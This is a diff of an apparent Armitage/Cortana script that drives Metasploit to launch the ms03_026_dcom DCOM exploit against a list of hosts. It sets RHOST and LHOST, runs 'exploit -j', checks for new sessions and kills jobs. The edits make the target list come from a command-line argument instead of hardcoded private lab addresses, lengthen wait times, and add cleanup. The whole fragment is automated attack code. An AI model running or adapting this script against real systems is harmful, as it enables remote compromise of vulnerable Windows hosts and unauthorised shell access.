@@ -2,8 +2,8 @@ command arguments {
    local('$counter @attacks $minBin');
 
    $counter = $1;
-   @attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,4.0;"); #172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
-   #@attacks = split(';', "$2");
+   #@attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,4.0;"); #172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
+   @attacks = split(';', "$2");
    $minBin = $3;
    $numExisting = $4;
 
@@ -184,7 +184,7 @@ on launch_attacks {
          cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
          cmd($console, "exploit -j");
       
-         sleep(4000);
+         sleep(10000);
          cmd($console, "jobs -K");
          sleep(1000);
          if (size(sessions()) > $numSessions) {
@@ -262,11 +262,15 @@ on sessionHandle {
 }
 
 on noSessions {
-   local('$host @hosts %exploits %exp_run $i $j $numRun');
+   local('$console $host @hosts %exploits %exp_run $i $j $numRun');
 
    @hosts = $1;
    %exploits = $2;
    %exp_run = $3;
+   $console = console();
+
+   cmd($console, "jobs -K");
+   sleep(1000);
 
    foreach $host (@hosts) {
       $numRun = %exp_run[$host];
@@ -277,5 +281,8 @@ on noSessions {
          }
       }
    }
+   cmd($console, "jobs -K");
+   sleep(1000);
+   cmd_stop($console);
    quit();
 }
